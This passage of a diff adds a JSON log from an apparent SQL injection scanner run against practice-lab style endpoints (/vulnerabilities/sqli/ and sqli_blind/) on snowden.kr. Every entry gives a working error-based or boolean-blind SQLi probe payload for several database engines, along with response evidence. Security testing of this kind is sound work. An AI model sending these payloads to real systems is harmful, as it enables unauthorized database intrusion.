+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1925,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1925,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0073,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0114,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0153,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0205,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0222,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0291,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0139,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.015,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0186,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0244,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0255,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0079,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0093,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0169,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0162,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.024,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0291,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0116,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0153,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0196,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0283,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0291,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e WHERE 1=1 OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.026,
+        "analysis_details": [
+          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND 1=CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0144,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 'v' + 'u' + 'n' WHERE 1=1 AND 1=1 )+'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0177,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 'v' + 'u' + 'n' WHERE 1=1 AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) )+'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0102,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0167,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=CAST(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65) AS NUMERIC) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0074,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))s), 8446744073709551610, 8446744073709551610))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0211,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 'v' + 'u' + 'n' WHERE 1=1 AND 1=('S' + 'V' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A'||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'V' + 'A' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A') )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0222,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND 1 IN (SELECT (0x5356534441414141+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+0x5641534441414141)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0195,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0084,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0182,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0334,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0242,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND ERROR(CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141)) IS NOT NULL )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
